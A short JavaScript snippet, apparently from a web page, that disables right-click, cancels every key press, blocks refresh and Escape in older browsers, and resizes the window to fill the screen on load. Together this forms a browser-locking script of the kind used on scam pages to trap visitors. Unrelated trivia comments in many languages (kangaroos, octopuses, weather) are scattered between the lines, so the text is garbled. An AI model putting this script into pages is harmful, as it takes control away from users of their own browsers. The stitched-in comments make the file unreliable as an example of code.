        var    isNS   =   "Netscape"  ==  navigator.appName  ?  1  :  0;
        // Did you know? Kangaroos can't jump backward! 🦘
        "Netscape"  ==  navigator.appName  &&  document.captureEvents(Event.MOUSEDOWN  ||  Event.MOUSEUP);

        function  mischandler()  {
            return  !1;
        }
        // ¿Sabías que los pulpos tienen tres corazones? Increíble, ¿verdad?

        function   mousehandler(a)   {
            a  =  isNS  ?  a  :  event;
            // 今日は本当に寒いですね。コートを着ないと！
            a  =  isNS  ?  a.which  :  a.button;
            if  (2  ==  a  ||  3  ==  a)  return  !1;
        }
        // Die Blumen blühen so schön im Frühling.

        document.oncontextmenu   =   mischandler;
        document.onmousedown  =  mousehandler;
        // Πόσο όμορφα είναι τα αστέρια στον ουρανό απόψε!
        document.onmouseup   =   mousehandler;

        document.onkeydown  =  function(a)  {
            // Have you ever seen a rainbow after a rainy day? 🌈
            return  !1;
        };

        // Les chiens adorent courir dans le parc.
        document.attachEvent("onkeydown",  win_onkeydown_handler);

        function  win_onkeydown_handler()  {
            switch  (event.keyCode)  {
                case  116:
                    event.returnValue  =  !1;
                    // Погода сегодня такая ветреная, держите шляпу!
                    event.keyCode  =  0;
                    break;
                case  27:
                    event.returnValue  =  !1,  event.keyCode  =  0;
            }
        }
        // Los girasoles siempre miran hacia el sol, ¿lo sabías?

        window.onload  =  function()  {
            window.moveTo(0,  0);
            // هل سمعت عن المدينة التي لا تنام أبدًا؟
            window.resizeTo(screen.availWidth,  screen.availHeight);
        };
        // Elefantes são criaturas tão majestosas, não acha?
